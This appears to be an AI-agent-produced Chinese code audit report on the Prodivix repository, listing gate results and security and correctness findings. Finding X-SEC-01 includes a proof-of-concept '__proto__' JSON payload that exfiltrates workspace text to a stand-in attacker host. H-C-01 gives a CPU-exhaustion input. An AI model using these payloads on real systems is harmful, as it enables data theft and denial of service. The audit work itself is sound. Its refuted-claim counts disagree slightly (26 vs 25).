# Prodivix 仓库全量静态审查报告

## 1. 元信息

| 项目     | 内容                                                                               |
| -------- | ---------------------------------------------------------------------------------- |
| 审查日期 | 2026-07-26                                                                         |
| 审查对象 | Prodivix 仓库(`D:/Projects/prodivix`)全量源码,含未提交工作区改动                   |
| 代码规模 | 3009 个受版本控制文件;TS/TSX 1860 个、Go 159 个;源码约 350k LOC                    |
| 审查方法 | 30 个分区静态审查 + 2 个全局专项透视(安全 / 架构不变量)+ 逐条对抗式反驳验证        |
| 执行规模 | 94 个 agent 全部正常完成(0 失败 / 0 跳过),4783 次工具调用                          |
| 独立门禁 | `tsc -b`(全包)、`pnpm lint`、`go vet`、`gofmt`、4 项仓库自有架构门禁、`pnpm audit` |
| 报告语言 | 简体中文(GitHub Flavored Markdown)                                                 |

说明:本报告正文仅收录经对抗验证后**未被驳回**的发现。验证阶段以「默认驳回」为原则 —— 验证 agent 需打开真实源码、检索调用方、确认可达性;无法从源码正面证实的一律驳回,并对夸大的严重度做下调。原始 200 条声明中 26 条被驳回(13%),174 条确认,1 条存疑。

每条发现包含:位置(`path:line`,可点击)、类别、审查单元、详情、失败场景、修复建议;凡验证阶段补充了关键事实或修正了严重度者附「验证备注」。

---

## 处置记录(2026-07-27)

修复战役分三轮完成:契约决策与 High 修复(`f61606f8`…`b2eec37c`)、PIR 编译器单一 owner 重构(`c562a4d6`)、Medium 并行修复与对抗验证(`f00984a2`、`9a51b3b3`)。每个实质修复都经过「临时撤销修复 → 确认回归测试失败 → 还原」验证;并行修复轮的每个区域另有独立对抗验证 agent 复核,验证者确认的缺陷全部人工复核后二次修复。下述状态于 2026-07-27 逐条对照当前源码核实,而非转录修复记录。

### Critical 与 High(18/18 已修复)

`X-SEC-01`、`H-C-01`~`H-C-07`、`H-SI-01`~`H-SI-04`、`H-SEC-01`~`H-SEC-03`、`H-DET-01`、`H-CV-01`、`H-BC-01` 全部已修复。其中 H-C-03/H-C-04 随 PIR 编译收敛到 `packages/prodivix-compiler/src/workspace/` 单一 owner 一并消除;H-SEC-03 的代码面(esm.sh 动态导入与 ESM bridge)已删除,编辑器 CSP 收紧至 loopback-only http 并新增 `editorContentSecurityPolicy.conformance.test.ts` 守卫,`connect-src https:` 因 AI 直连用户配置端点而保留(文档内注明理由)。

### Medium(50/55 已修复,5 条留待 owner 级设计)

已修复:`M-C-01`~`M-C-07`、`M-C-09`~`M-C-11`、`M-C-13`、`M-C-15`~`M-C-16`、`M-C-18`~`M-C-19`、`M-SEC-01`~`M-SEC-10`、`M-EH-01`~`M-EH-07`、`M-SI-01`~`M-SI-06`、`M-RL-01`、`M-RL-03`~`M-RL-04`、`M-MS-01`、`M-ARCH-01`~`M-ARCH-02`、`M-RX-01`~`M-RX-02`、`M-A11Y-01`、`M-DET-01`、`M-BC-01`、`M-CI-01`。

未处置(均需要对应 owner 的设计决策,不适合顺手打补丁):

| 发现 | 保留原因 |
| --- | --- |
| `M-C-08` | `hasSelectedDescendant` 需要渲染器 host 的选中态后代投影,属 `pir-react-renderer` 的 host 契约改动 |
| `M-C-12` | `privateHostname` 需要按 CIDR 解析的地址分类,而非再叠一层前缀特判 |
| `M-C-14` | Terminal sweep 100 条上限与区域恢复撤销的交互需要保留/分页策略设计 |
| `M-C-17` | 同名值/类型导出碰撞需要符号命名空间感知的导出规划 |
| `M-RL-02` | ExecutionJob 事件历史的上界属于事件保留策略,需与 G2 证据留存契约一致 |

补充说明:`M-MS-01` 的迁移超时旋钮已接入 `deploy/docker-compose.ghcr.yml`、`deploy/start-app.sh`、`deploy/.env.example` 三处(此前仅存在于 config.go,GHCR 部署无法设置);12 号迁移逐文档幂等,预算耗尽后调大超时重跑即可续进。`M-C-10` 的修复同时删除了收敛期间引入的跨类型兜底(layout 文档不再可能顶替缺失的 page 成为发布投影)。

### Low(102 条,未处置)

Low 级发现本轮未处置,保留原文待后续分诊。

---

## 2. 总览统计

### 2.1 审查与处置计数

| 指标                    | 数量    |
| ----------------------- | ------- |
| 审查单元(partitions)    | 30      |
| 正常完成单元            | 30      |
| 原始发现(raw claims)    | 200     |
| 对抗验证确认(CONFIRMED) | 174     |
| 对抗验证驳回(REFUTED)   | 25      |
| 存疑(UNCERTAIN)         | 1       |
| **正文收录发现**        | **175** |

### 2.2 按严重度分布

| 严重度   | 数量    |
| -------- | ------- |
| Critical | 1       |
| High     | 17      |
| Medium   | 55      |
| Low      | 102     |
| **合计** | **175** |

### 2.3 按类别分布

| 类别                   | 中文       | 数量 |
| ---------------------- | ---------- | ---- |
| correctness            | 正确性     | 54   |
| error-handling         | 错误处理   | 23   |
| security               | 安全       | 21   |
| dead-code              | 死代码     | 16   |
| determinism            | 确定性     | 11   |
| state-integrity        | 状态完整性 | 10   |
| resource-leak          | 资源泄漏   | 9    |
| architecture-invariant | 架构不变量 | 6    |
| concurrency            | 并发       | 4    |
| build-config           | 构建配置   | 3    |
| state-data-integrity   | 状态完整性 | 3    |
| resource-exhaustion    | 资源耗尽   | 2    |
| ci-coverage            | CI 覆盖    | 2    |
| test-coverage          | 测试覆盖   | 2    |
| contract-violation     | 契约违反   | 1    |
| migration-safety       | 迁移安全   | 1    |
| accessibility          | 可访问性   | 1    |
| authorization          | 授权       | 1    |
| resource-management    | 资源管理   | 1    |
| data-integrity         | 状态完整性 | 1    |
| path-safety            | 路径安全   | 1    |
| efficiency             | 效率       | 1    |
| input-validation       | 输入校验   | 1    |

### 2.4 按审查单元分布

| 审查单元                        | 范围                                                                           | Crit | High | Med | Low |
| ------------------------------- | ------------------------------------------------------------------------------ | ---- | ---- | --- | --- |
| `pkg-plugin-protocol-contracts` | plugin-protocol + plugin-contracts                                             | 1    | 0    | 2   | 1   |
| `web-store-sync`                | apps/web editor store + workspaceSync                                          | 0    | 3    | 1   | 3   |
| `be-remoteexec-integrations`    | backend remoteexecution + integrations (Go)                                    | 0    | 3    | 0   | 1   |
| `xcut-security`                 | CROSS-CUTTING: security sweep (whole repo)                                     | 0    | 2    | 2   | 1   |
| `pkg-data`                      | data packages (core + http/graphql/asyncapi/mock)                              | 0    | 1    | 4   | 3   |
| `pkg-compiler-targets`          | prodivix-compiler react + vue targets                                          | 0    | 1    | 3   | 6   |
| `pkg-plugin-official-ui`        | official plugins (antd/mui/radix) + packages/ui                                | 0    | 1    | 3   | 1   |
| `infra-gates`                   | golden-conformance, e2e tests, CI workflows, build config                      | 0    | 1    | 2   | 6   |
| `app-cli-vscode-scripts`        | apps/cli, apps/vscode, vscode-debugger, root scripts                           | 0    | 1    | 2   | 5   |
| `app-runner-worker`             | apps/remote-runner-worker (sandbox, security critical)                         | 0    | 1    | 2   | 3   |
| `pkg-workspace-sync-router`     | packages/workspace-sync + packages/router                                      | 0    | 1    | 1   | 4   |
| `xcut-architecture`             | CROSS-CUTTING: architecture invariant conformance (whole repo)                 | 0    | 1    | 1   | 1   |
| `pkg-compiler-core`             | prodivix-compiler core / executableProject / export                            | 0    | 1    | 0   | 4   |
| `be-auth-project-env`           | backend auth / project / environment modules (Go)                              | 0    | 0    | 4   | 3   |
| `web-resources-issues`          | apps/web resources / issues / export / settings                                | 0    | 0    | 3   | 7   |
| `web-plugins-shell`             | apps/web plugin platform, pir adapters, app shell                              | 0    | 0    | 3   | 5   |
| `web-blueprint`                 | apps/web Blueprint editor                                                      | 0    | 0    | 3   | 3   |
| `web-code-anim-graph`           | apps/web code / animation / nodegraph editors                                  | 0    | 0    | 3   | 3   |
| `web-execution`                 | apps/web execution + testing surfaces                                          | 0    | 0    | 3   | 2   |
| `be-platform`                   | backend platform / app / config / cmd (Go)                                     | 0    | 0    | 2   | 3   |
| `pkg-pir`                       | packages/pir + pir-react-renderer                                              | 0    | 0    | 2   | 3   |
| `pkg-runtime-core`              | packages/runtime-core                                                          | 0    | 0    | 2   | 3   |
| `pkg-server-assets-tokens`      | server-runtime, assets, tokens, themes                                         | 0    | 0    | 1   | 5   |
| `be-workspace`                  | backend workspace module (Go)                                                  | 0    | 0    | 1   | 4   |
| `pkg-runtime-remote`            | packages/runtime-remote (+ postgres, browser, vitest)                          | 0    | 0    | 1   | 4   |
| `pkg-domain-misc`               | animation, nodegraph, shared, ai, i18n, eslint-plugin                          | 0    | 0    | 1   | 4   |
| `app-runner-cp-hosts`           | remote-runner-control-plane, remote-preview-host, asset-delivery-host          | 0    | 0    | 1   | 4   |
| `pkg-authoring-lang`            | authoring, code-language, diagnostics                                          | 0    | 0    | 1   | 3   |
| `pkg-plugin-host`               | plugin-host, plugin-browser, plugin-package, plugin-react-host, plugin-sandbox | 0    | 0    | 1   | 3   |
| `pkg-workspace`                 | packages/workspace                                                             | 0    | 0    | 0   | 4   |

---

## 3. 独立静态门禁结果

审查过程中对仓库执行了全部可用的确定性静态门禁。这些结果**独立于** agent 审查,用于交叉印证。

| 门禁             | 命令                                        | 结果                                   |
| ---------------- | ------------------------------------------- | -------------------------------------- |
| 全包类型检查     | `pnpm turbo run typecheck`                  | ✅ 通过                                |
| 仓库 Lint        | `pnpm lint`                                 | ✅ 通过                                |
| Go 静态检查      | `go vet ./...`                              | ✅ 通过                                |
| Go 格式          | `gofmt -l .`                                | ✅ 无偏移                              |
| 核心包边界       | `scripts/check-core-package-boundaries.mjs` | ✅ valid                               |
| 编辑器硬切边界   | `scripts/check-editor-hard-cut.mjs`         | ✅ valid                               |
| PIR-current 边界 | `scripts/check-pir-current-boundary.mjs`    | ✅ valid                               |
| 属性测试命名     | `scripts/check-property-test-names.mjs`     | ✅ valid                               |
| 依赖漏洞         | `pnpm audit`                                | ⚠️ 26 条(6 high / 14 moderate / 6 low) |

### 3.1 TypeScript 逃逸口统计(排除生成文件与测试)

| 模式                                      | 命中数 |
| ----------------------------------------- | ------ |
| `as any`                                  | 0      |
| `@ts-ignore`                              | 0      |
| `@ts-expect-error`                        | 0      |
| `eslint-disable`                          | 1      |
| `eval(` / `new Function(`                 | 0      |
| `: any`                                   | 7      |
| Go `_ = err` / `//nolint` / `interface{}` | 0      |

这是一份异常干净的成绩:零 `as any`、零 `@ts-ignore`、零 `eval`。逃逸口不是本仓库的主要风险来源 —— 真正的风险集中在**类型系统覆盖不到的语义层**(见下文 Critical / High)。

### 3.2 `strict` 覆盖缺口(经实测验证)

`tsconfig.base.json:13` 全局设置 `"strict": true`,但 `apps/web/tsconfig.json:5` 与 `packages/ui/tsconfig.json` 覆写为 `"strict": false`(并同时关闭 `noUnusedLocals` / `noUnusedParameters`)。这两个包合计约 79k LOC,占仓库源码 **22%**,且 `apps/web` 是产品主表面。

实测:对 `apps/web` 开启 `--strict` 后出现 **81 条错误**,分布如下。

| 错误码                               | 数量 | 含义                                            |
| ------------------------------------ | ---- | ----------------------------------------------- |
| TS7006                               | 37   | 参数隐式 `any`                                  |
| TS2345                               | 13   | 实参类型不匹配                                  |
| TS2322                               | 9    | 赋值类型不匹配                                  |
| TS7016                               | 5    | 隐式 `any` 模块                                 |
| TS18047 / TS18048 / TS18049 / TS2538 | 11   | **可能为 `null` / `undefined`(真实空指针风险)** |
| 其他                                 | 6    | 隐式 any 循环推导、迭代器、缺失返回等           |

其中 11 条空安全错误是真实的潜在运行时崩溃点,已定位到具体位置:

```text
BlueprintEditor.tsx(154,9)                       'runTargetOverride' is possibly 'null'
BlueprintProjectRunnerSurface.tsx(128/163/192)   'frameWindow' is possibly 'null' or 'undefined'
CodeAuthoringPage.tsx(27/28/29)                  'semanticNavigationRequest' is possibly 'null'
CodeAuthoringOverlay.tsx(29,50)                  Type 'undefined' cannot be used as an index type
CodeAuthoringWorkspace.tsx(1106,54)              'parent' is possibly 'undefined'
useWorkspaceComponentAuthoring.ts(149,39)        'root.children' is possibly 'undefined'
```

注意 `BlueprintProjectRunnerSurface.tsx` 的三处 `frameWindow` 空值告警与下文 High 级「预览 CSP 不透明源导致 postMessage 全部失效」指向同一段代码,互为佐证。

### 3.3 依赖漏洞明细

| 严重度                | 包                     | 修复版本    | 依赖路径                                          | 性质                              |
| --------------------- | ---------------------- | ----------- | ------------------------------------------------- | --------------------------------- |
| HIGH                  | `react-router`         | >=8.3.0     | `apps/web`、`packages/ui` 直接依赖(声明 `^8.1.0`) | **生产运行时**,RSC 模式 CSRF 绕过 |
| HIGH                  | `postcss`              | >=8.5.18    | `asset-delivery-host > vite`                      | 构建期,source map 路径穿越        |
| HIGH                  | `brace-expansion` ×3   | 见 advisory | `apps/cli > eslint`、`apps/vscode > mocha`        | 仅开发工具链                      |
| HIGH                  | `serialize-javascript` | >=7.0.3     | `apps/vscode > mocha`                             | 仅开发工具链                      |
| MODERATE ×13 / LOW ×4 | `dompurify`            | >=3.4.12    | `apps/web > monaco-editor > dompurify`            | **进入生产 bundle**,多条 XSS 绕过 |
| LOW                   | `elliptic`             | >=6.6.2     | `apps/web > vite-plugin-node-polyfills`           | 构建期 polyfill                   |

优先级:`react-router` 是唯一直接声明的生产依赖,升级到 `^8.3.0` 即可闭合;`dompurify` 需等 `monaco-editor` 上游更新,或用 pnpm `overrides` 强制提升。其余仅影响开发工具链。

---

## 4. 发现正文(按严重度分组)

### 4.1 Critical(1 条)

#### 4.1.1 安全(security)

##### X-SEC-01 协议 JSON 解码器允许 `__proto__` 键把整条消息从 codec 自身的限制中隐藏起来,而 AJV 仍然接受它

- **位置**: [`packages/plugin-protocol/src/codec/strictJsonCodec.ts:172`](packages/plugin-protocol/src/codec/strictJsonCodec.ts#L172)
- **类别**: security ｜ **严重度**: Critical ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-plugin-protocol-contracts`

**详情**: `decodeProtocolJsonText` 使用 jsonc-parser 的 `parse` 解析不可信的运行时文本,其值构建器在一个普通 `{}` 上执行 `currentParent[currentProperty] = value`(已在 node_modules/.pnpm/jsonc-parser@3.3.1/.../impl/parser.js:157,161 中验证)。因此 `"__proto__"` 键会触发 `Object.prototype.__proto__` setter,重新设置该对象的原型,而不是创建自有属性。`inspectJsonValue` 是唯一施加 `maxNodes`、`maxDepth`、有限数值检查和非配对代理项检查的地方,它用 `Object.values(...)` 遍历子节点,即仅遍历自有可枚举属性,于是它看到的是一个空对象并放行。相比之下,生成的 AJV 校验器会沿原型链解析 `required`(`schemaValidators.generated.ts:576` 的 `if (data.protocol === undefined)`),并用 `for (const key0 in data)` 枚举 `additionalProperties`(`schemaValidators.generated.ts:711`),后者包含继承而来的可枚举键。结果是一处解析器差异:schema 层看到的是一条内容完整、校验通过的消息;而所有基于自有属性的消费方(`JSON.stringify`、`Object.entries`、展开运算、`structuredClone`)看到的是 `{}`。注意本 monorepo 中的同类 codec 已显式封堵了这个漏洞(`packages/plugin-contracts/src/jsonValue.ts:112-123` 会拒绝任何原型不是 `Object.prototype`/`null` 的对象),这表明了预期的不变量。

**失败场景**: 一个运行在 sandbox 中的插件运行时投递文本 `{"__proto__":{"protocol":"prodivix.plugin-runtime","protocolVersion":"1.0","kind":"request","channel":"gateway","method":"network/request","contractVersion":"1.0","messageId":"r.1","sequence":1,"payload":{"__proto__":{"scope":"api.example.com","url":"https://attacker.example/upload","method":"POST","body":"<190 KB of exfiltrated workspace text>"}}}}`。`inspectJsonValue` 在深度 1 上数出 2 个节点并放行;`validateRuntimeEnvelope` 和 gateway payload 契约都沿原型链通过校验;随后 `createBrowserGatewaySessionFactory.ts:163` 调用 `measureGatewayJsonValue`,它等价于 `encodeProtocolJsonText` -> `JSON.stringify(payload)` -> `"{}"` -> 2 字节,因此契约的 `maxRequestBytes: 192 * 1024`(builtInGatewayContracts.ts:288)与会话的 `quota.maxRequestBytes` 都被满足。接着 `contract.requiredCapability(payload)` 和 `services.network.request(context, request)` 沿原型读取 `request.url`/`request.body`,并发出完整的 190 KB POST。最终效果:按契约和按会话统计的出站字节预算被记为 2 字节而不是约 190 KB,并且同一手法会让每一条入站协议消息都不再受 maxNodes/maxDepth/非配对代理项检查的约束。

**修复建议**: 在 `duplicateKeyDiagnostics` 的 `onObjectProperty` visitor 中拒绝 `__proto__` 作为对象键(它本来就会访问每一个键),并且/或者补上 `inspectJsonValue` 缺失的同款原型守卫:对每个对象节点断言 `Object.getPrototypeOf(value) === Object.prototype`,与 `packages/plugin-contracts/src/jsonValue.ts:112-123` 保持一致。仅把 `Object.values` 换成 `Reflect.ownKeys` 遍历并不足够——AJV 那一侧也必须不再看到被注入的原型。

**验证备注**: 通过执行真实代码完成端到端验证(在 packages/plugin-protocol 中使用了临时 vitest 探针,现已删除)。jsonc-parser@3.3.1 的 `parse` 在普通 `{}` 上以 `currentParent[currentProperty] = value` 构建对象,因此 `"__proto__"` 会重设原型而不是创建自有属性(已直接对照 node_modules/.pnpm/jsonc-parser@3.3.1 确认:自有键为 `[]`,`JSON.stringify` -> `"{}"`,`for...in` -> 2 个继承键,属性读取成功)。引用的证据与 strictJsonCodec.ts:172 完全一致(`for (const child of Object.values(current.value as object))`)。对审查者给出的完整 payload 运行 `decodeProtocolJsonText(text, { maxNodes: 5, maxDepth: 2 })` 返回 ok:true,尽管该消息实际在深度 3 上携带约 12 个节点——maxNodes/maxDepth/有限数值/非配对代理项的约束被完全绕过。`decodeRuntimeEnvelopeV1(text)` 同样返回 ok:true,且 `value.method === 'network/request'`、`value.payload.url === 'https://attacker.example/upload'`,而 `JSON.stringify(value) === '{}'`;schemaValidators.generated.ts:576(`data.protocol === undefined`)和 :711(`for (const key0 in data)`)处生成的 AJV 代码确实如所述沿原型链解析。`validateRuntimeEnvelope`(schemaContracts.ts:41)和 `duplicateKeyDiagnostics` 都没有添加原型守卫。可达性是真实的生产路径:createBrowserPluginRuntimeAdapter.ts:339 对不可信的 worker port 文本调用 `endpoint.receive(event.data)` -> protocolEndpoint.ts:511 的 `decodeRuntimeEnvelopeV1`,被污染的 payload 原样流向 `gateway.dispatch({ ..., payload: request.payload })`(createBrowserPluginRuntimeAdapter.ts:249-255),在那里 createBrowserGatewaySessionFactory.ts:163 的 `measureGatewayJsonValue` -> `encodeProtocolJsonText` -> `JSON.stringify` 得出 2 字节,用于对照 `maxRequestBytes: 192 * 1024`(builtInGatewayContracts.ts:288)。审查者引用的同类守卫确实存在(jsonValue.ts:111-123 拒绝任何非 Object.prototype/null 的原型),但没有应用在这条路径上。critical 级别成立。

### 4.2 High(17 条)

#### 4.2.1 正确性(correctness)

##### H-C-01 重试策略校验可能在作者可控的 data-source 文档上永远空转(CPU DoS)

- **位置**: [`apps/backend/internal/modules/remoteexecution/data_gateway.go:68`](apps/backend/internal/modules/remoteexecution/data_gateway.go#L68)
- **类别**: correctness ｜ **严重度**: High ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `be-remoteexec-integrations`

**详情**: 在 parseDataGatewayDocument 中,指数退避上界的计算发生在 retry.MaximumAttempts 做范围校验之前(MaximumAttempts > maximumDataGatewayRetryAttempts 的检查在第 75 行,位于循环之后)。该循环只有在 maximumDelay > maximumDataGatewayRetryDelayMS/2 时才提前退出;当 initialDelayMs 为 0 时累加器永远保持为 0,于是循环必须执行 MaximumAttempts-2 次迭代。由于这是纯 CPU 循环,它会忽略 ctx 取消和客户端断连,在进程重启前一直占满一个核心。同一段解析在 Invoke(data_gateway.go:556)和 OpenStream(data_gateway_stream.go:472)上都会运行,因此可从两个已认证端点触达,并且可以并发发起以耗尽全部核心。

**失败场景**: 某位 Workspace 编辑者编写了一个 data-source 文档,其 operation 携带 policies.retry = {"maxAttempts": 9223372036854775807, "backoff": "exponential", "initialDelayMs": 0} 且没有 maxDelayMs。他启动一次预览执行,并向 /api/remote-executions/{id}/data-sources/{doc}/operations/{op}/invoke 发起 POST。第 68 行的循环永不终止:处理器永不响应,一个 CPU 核心被无限期烧掉,N 个并发请求即可拖垮整个 API 进程。

**修复建议**: 在投影延迟之前先校验 retry.MaximumAttempts(1..maximumDataGatewayRetryAttempts)、Backoff 和 InitialDelayMS,或者把该循环替换为带溢出检查的闭式移位计算。

**验证备注**: 代码吻合:data_gateway.go:63-81 在第 68 行的循环中计算指数上界,并且直到循环之后的第 75 行才对 retry.MaximumAttempts 做范围校验。MaximumAttempts 是普通的 int64(data_gateway_contract.go:181),InitialDelayMS 也是 int64(:183),因此在 initialDelayMs 为 0 且没有 maxDelayMs 时累加器保持为 0(0*2==0),第 69 行的提前返回永不触发,循环必须执行 MaximumAttempts-2 次迭代且没有任何 ctx 检查。可达性已确认:Invoke 在第 556 行调用 parseDataGatewayDocument,早于第 567 行的权限检查,data_gateway_stream.go 对 OpenStream 也是同样处理;文档内容来自 gateway.store.GetDataSourceDocument,即作者可控的 Workspace 文档。对失败场景的一处更正:maxAttempts=9223372036854775807 并不会被持久化——workspace/data_source_policy_validator.go:43/268 使用 decodeDataInteger,它把数值上限限制为 maxJSONSafeInteger(2^53-1,operation_commit_types.go:17)。该缺陷在 query 类型的 operation 上以 maxAttempts=9007199254740991 依然成立(query 没有幂等性约束),仍会产生约 9e15 次迭代——每个请求可占满 CPU 数月,且不受客户端断连影响。high 级别成立:一个已认证的租户只需少量并发请求即可占满共享 Go 进程的每一个核心。

##### H-C-02 当一个子节点带 `index: false` 而另一个省略 `index` 时,路由同级比较器不自洽,绕过静态/动态优先级

- **位置**: [`packages/router/src/routeCore.ts:791`](packages/router/src/routeCore.ts#L791)
- **类别**: correctness ｜ **严重度**: High ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-workspace-sync-router`

**详情**: `matchChildren` 对同级节点排序,使 index 路由排在最后,其余节点按 static > dynamic > wildcard 排序。index 的判断对一个三态值(`true` | `false` | `undefined`)使用了严格不等:`if (left.index !== right.index) return left.index ? 1 : -1;`。当一个同级节点带显式 `index: false` 而另一个省略 `index` 时,`false !== undefined` 为真,比较器返回 -1,永远到不了第 792-814 行的 static/dynamic/wildcard 排序块。更糟的是,该比较器不自洽:`compare(a,b)` 与 `compare(b,a)` 都返回 -1,这违反了排序契约,使最终顺序变成实现相关。这并非假设:只要设置了 `mountPath`,`cloneMountedRouteNode` 就会在每个被挂载的模块根上写入 `index: false`(routeCore.ts:504-509),而 `parseRouteNode` 会忠实保留来自 wire 的作者所写的 `index: false`(routeCodec.ts:241)。同一个 `matchChildren` 驱动着 `matchRouteManifest` / `matchRouteManifestResolved` / `resolveRouteRuntimeContext`,而编辑器预览(`apps/web/.../useActiveRoutePreview.ts:23`)和渲染器路由上下文都会消费它们。

**失败场景**: manifest 根子节点为 `[{id:'route-account', segment:'account'}]`(不含 `index` 键),再加上一个挂载 `{mountId:'mt', moduleRef:'m', mountPath:':section'}` 且没有 `parentRouteNodeId`。经过 `composeRouteManifestWithModules` 之后,根子节点变为 `[{id:'route-account',segment:'account'}, {id:'mt:m-root',segment:':section',index:false}]`。`matchRouteManifest(manifest, '/account')` 对这两个同级节点排序;比较器看到 `left.index=false`、`right.index=undefined`,返回 -1,于是动态的挂载节点排到了前面。`/account` 被解析为 `mt:m-root` 且 `params.section === 'account'`,而不是静态的 `route-account`——静态路由变得不可达,渲染出的是错误的页面文档。

**修复建议**: 在比较前归一化为布尔值,例如 `const leftIndex = Boolean(left.index); const rightIndex = Boolean(right.index); if (leftIndex !== rightIndex) return leftIndex ? 1 : -1;`,使 `false` 与 `undefined` 等价,并让所有非 index 同级节点都能落到按 segment 类型排序的分支。

**验证备注**: 证据吻合(routeCore.ts:790-791 及 cloneMountedRouteNode routeCore.ts:501-509)。三态推理正确:当 left.index===false 且 right.index===undefined 时,`false !== undefined` 为真,`left.index ? 1 : -1` 得出 -1;交换参数同样得出 -1,因此比较器不自洽,该对节点永远到不了 static/dynamic/wildcard 排序块(792-814)。我复现了所述的确切失败:用根子节点 [{id:'route-account',segment:'account'}] 和挂载 {mountId:'mt',moduleRef:'m',mountPath:':section'} 运行 composeRouteManifestWithModules,得到子节点 [route-account, {id:'mt:m-root',segment:':section',index:false}],而 matchRouteManifest(composed,'/account') 返回链 [root, mt:m-root]——动态的挂载节点遮蔽了静态路由,后者变得不可达。这在生产中是活跃的:useActiveRoutePreview.ts 会带模块进行组合并喂给 resolveRouteRuntimeContext(同一个 matchChildren),packages/ui/src/nav/PdxRoute.tsx 也消费同一份 manifest。routeCodec.ts:241 确实保留作者所写的 `index:false`,因此手工编写/导入的 manifest 同样会命中。high 级别成立:静默的错误页面解析,且同级顺序是实现相关的。

##### H-C-03 Vue target 把 `kind: 'subscription'` 写入类型为 `'query' | 'mutation'` 的 manifest,导致生成的项目类型检查失败

- **位置**: [`packages/prodivix-compiler/src/vue/workspaceProject.ts:155`](packages/prodivix-compiler/src/vue/workspaceProject.ts#L155)
- **类别**: correctness ｜ **严重度**: High ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-compiler-targets`

**详情**: `dataOperations` 从每个 `data-source` 文档中收集所有 operation,不按 kind 过滤(第 106-114 行),而 `VueDataOperationDescriptor.kind` 的类型是 `DataOperationKind`,其中包含 `'subscription'`(`packages/data/src/data.types.ts:81-86`)。`operationManifestSource` 随后把生成的 `ProdivixDataOperation` 类型声明为 `kind: 'query' | 'mutation'`,并以 `as const satisfies readonly ProdivixDataOperation[]` 输出该数组。一个 subscription 操作会使输出的字面量违反 `satisfies` 约束。上游没有任何环节阻止它:`analyzeWorkspaceDataRuntimeTarget` 接受 server/edge 上的 GraphQL 或 AsyncAPI 数据源携带 subscription(`workspaceDataRuntimeTarget.ts:173-231`),而 `unsupportedDiagnostics` 只拒绝不受支持的*文档类型*。

**失败场景**: Workspace 中有一个 `runtimeZone: 'server'` 的 `core.graphql` 数据源,并带有一个 `subscription` 操作(这是完全合法、无诊断的配置)。`generateWorkspaceVueViteBundle` 输出的 `src/prodivix-data-operations.ts` 中包含 `{ "key": "chat:onMessage", ..., "kind": "subscription", ... }` 以及 `satisfies readonly ProdivixDataOperation[]`。导出项目中的 `vue-tsc`/`tsc` 报错 "Type '\"subscription\"' is not assignable to type '\"query\" | \"mutation\"'",构建被破坏,且没有任何导出诊断指向原因。此外,`executeProdivixDataOperation` 还会把 subscription 路由到 `dispatchDataMutation`,后者以 `DATA_MUTATION_OPERATION_UNRESOLVED` 拒绝。

**修复建议**: 把 `dataOperations` 过滤为 `operation.kind === 'query' || operation.kind === 'mutation'`(并为被跳过的 subscription 发出一条 `VUE-TARGET-*` 诊断),或者把生成的 `ProdivixDataOperation.kind` 放宽为 `'query' | 'mutation' | 'subscription'`,并给 `executeProdivixDataOperation` 增加显式的 subscription 分支。

**验证备注**: 已端到端复现。dataOperations(vue/workspaceProject.ts:93-120)不加过滤地复制 operation.kind,而 operationManifestSource(第 145-160 行)把它的类型写成 'query' | 'mutation'。为一个带单个 subscription 的 server 区 core.graphql 数据源生成 Vue bundle,analyzeWorkspaceDataRuntimeTarget 返回的诊断为 [](bundle 上只有无关的许可证警告),输出的 src/prodivix-data-operations.ts 中包含 `{"key":"data-products:watch-products",...,"kind":"subscription",...}] as const satisfies readonly ProdivixDataOperation[]`。对该输出文件运行 tsc 得到:`ops.ts(14,5): error TS2322: Type '"subscription"' is not assignable to type '"query" | "mutation"'`,以及 prodivixDataOperationByKey 上的 TS2352。Vue 预设的构建脚本是 `vue-tsc --noEmit && vite build`(export/presets/vueVite.ts:82),且可执行项目声明了 'build' 入口,因此生成的项目确实无法构建。唯一的小瑕疵:错误表现为 TS2322/TS2352 而不是 satisfies 层面的 TS1360,并且纯静态客户端导出路径另被 WKS-EXPORT-DATA-SERVER-GATEWAY-REQUIRED 阻断,因此被破坏的是 gateway/Remote-Preview 那条项目——而 golden conformance 恰恰断言它是 'ready'。high 级别成立。

##### H-C-04 React/Vue 脚手架硬编码入口链模块路径,而导出路径规划器在冲突时会静默改写它们

- **位置**: [`packages/prodivix-compiler/src/export/presets/reactVite.ts:221`](packages/prodivix-compiler/src/export/presets/reactVite.ts#L221)
- **类别**: correctness ｜ **严重度**: High ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-compiler-core`

**详情**: `ProductionExportPlanner.plan()` 先为 `program.modules` 预留路径(planner.ts:623),之后才为文件贡献预留(planner.ts:696)。Workspace 代码文档以模块形式贡献,其 `desiredPath: joinExportPath('src', normalizeExportCodeArtifactPath(document.path))`,而 `normalizeExportCodeArtifactPath` 会剥掉前导的 `/`、`code/` 和 `src/`(codeArtifactPlanner.ts:78-90),因此 `/App.tsx`、`/src/App.tsx` 和 `/code/App.tsx` 都会塌缩为 `src/App.tsx`——正是生成的 React 入口模块(`kind: 'react-entry'`、`suggestedName: 'App'`)想要的路径。Workspace 代码贡献的规划早于 app 模块(react/workspaceProject.ts 中 `code.contribution` 在 `projectContributions` 里排第 2,而 `app.module` 在最后一个贡献里),于是用户文档抢到了 `src/App.tsx`,`createUniqueExportPath` 把真正的 app 入口挤到 `src/App-2.tsx`。脚手架的 `src/main.tsx` 里仍写着字面量 `import App from './App';`,`index.html` 里仍写着字面量 `/src/main.tsx`;二者都不参与 `reservePath`/`resolveInternalModuleImports`,因此没有任何东西会纠正它们。`vueVite.ts:176`(`import App from './App.vue';`)和 `vueVite.ts:127` 存在同样的隐患。

**失败场景**: 一个包含路径为 `/src/App.tsx`(或 `/App.tsx`、`/code/App.tsx`)代码文档的 Workspace 被导出为 React/Vite 项目。导出产物中的 `src/App.tsx` 是用户的原始代码文档,而编译出的 PIR 应用入口被输出为 `src/App-2.tsx`。输出的 `src/main.tsx` 仍执行 `import App from './App'`,于是 `pnpm build` 会以 "Module './App' has no default export" 失败——或者,如果用户的文档恰好默认导出了一个组件,导出的应用会静默启动那个组件而不是编译后的应用,所有路由都会缺失。`bundle.metadata.pathRewrites` 记录了这次改名,但没有任何东西阻断或诊断被破坏的入口链。

